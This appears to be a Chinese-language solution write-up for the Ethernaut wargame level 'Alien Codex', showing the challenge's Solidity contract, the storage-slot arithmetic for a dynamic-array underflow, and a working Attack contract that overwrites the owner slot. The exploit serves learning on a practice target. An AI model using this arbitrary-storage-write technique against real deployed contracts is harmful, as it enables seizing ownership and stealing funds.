#   Level 19 Alien Codex
實例地址：`0x6FfFDB7cAf247C612369eC6024C203ddc82cD184`

##  題目說明
你揭開了一個 Alien 合約. 宣告你的所有權來完成這一關。

  可能會有用的資訊

研究陣列是如何在 storage 中運作的
研究 ABI specifications
使用一個非常 狡詐 的手段
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```

##  POC
這關是透過動態陣列溢位的方式更改到 `slot 0` 的數值，`storage`的最大存儲量 $2^{256}$ slots。
計算方式起始位置為 `keccak256(p)`，`p` 為存放陣列長度的值，`codex[0]` 的記憶體位置為 `keccak256(1) + 0`, `codex[1]` 為 `keccak256(1) + 1`，所以我們只要計算 $2^{256}-keccak256(1)$ 就可以推導出他的 `index`。

### 推導公式
$$
codex[0] = keccak256(1) + 0 \newline
codex[index] = keccak256(1) + index \newline
codex[index] = keccak256(1) + index = 2^{256} \newline
index = 2^{256} - keccak256(1)
$$

| Slot Number | Variables |
|-------------|-----------|
| 0           | address _owner & bool contact |
| 1           | len(codex) |
| ...         | ... |
| keccak256(1) | codex[0] |
| keccak256(1)+1 | codex[1] |
| keccak256(1)+2 | codex[2] |
| ...         | ... |
| 2^256       | codex[2^256 - 1 - unit(keccak256(1))] |
| 0           | codex[2^256 - 1 - unit(keccak256(1)) + 1] : (slot 0) |

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface AlienCodex{
    function makeContact() external;
    function retract() external; // 將陣列長度設置為 2^256-1
    function revise(uint256 i, bytes32 _content) external;
}

contract Attack{
    constructor(address target){
        AlienCodex(target).makeContact();
        AlienCodex(target).retract();
        uint256 index = (2**256-1) - uint256(keccak256(abi.encode(1))) + 1; // (2**256-1) 讓 complier 不會偵測到數值溢位，最後在把 1 加回去
        AlienCodex(target).revise(index, bytes32(uint256(uint160(tx.origin))));
        //將值改為地址存入
        //提醒將值直接改為 bytes20 是會放在前面 0xhere 而不適 0x....here
    }
}
```